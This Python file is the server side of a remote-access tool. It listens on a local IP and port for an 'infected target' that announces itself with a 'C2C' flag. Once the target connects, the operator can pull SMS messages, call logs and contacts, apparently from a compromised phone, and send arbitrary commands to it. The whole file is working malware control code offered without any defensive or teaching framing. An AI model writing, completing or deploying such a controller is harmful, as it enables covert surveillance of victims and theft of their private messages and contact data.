from socket import *
import os

HOST = "192.168.43.45"
PORT = 666


s = socket(AF_INET, SOCK_STREAM)
s.bind((HOST, PORT))
print("[INFO] Listening on "+str(HOST)+":"+str(PORT)+" awaiting target")
s.listen(1)


while True:

    conn, addr = s.accept()
    print("Incoming connection from target :" , addr)
    msg = conn.recv(1024)
    
    if str(msg.decode("UTF-8")) == "C2C":
        print("[INFO] Flag has been received, target is successfully infected, let's go\n")

        while True:

            cmd = str(input(">>> "))

            if cmd is None:

                continue

            else:

                if cmd == str("sms"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(16384)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))

                        except Exception as e:

                            print("[WARN] Exception caught => "+str(e))
                            continue

                elif cmd == str("call"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(16384)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))
                        
                        except Exception as e:
                            print("[WARN] Exception caught => "+str(e))
                            continue

                elif cmd == str("contact"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(16384)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))
                        
                        except Exception as e:
                            print("[WARN] Exception caught => "+str(e))
                            continue

                else: 

                    try:

                        conn.send(cmd.encode("UTF-8"))
                        msg_rp = conn.recv(1024)
                        print(msg_rp.decode("UTF-8"))
                    
                    except Exception as e:

                        print("[WARN] Exception caught => "+str(e))
                        continue


    else:
        print("[WARN] Wrong/No flag has been received quiting")
        exit()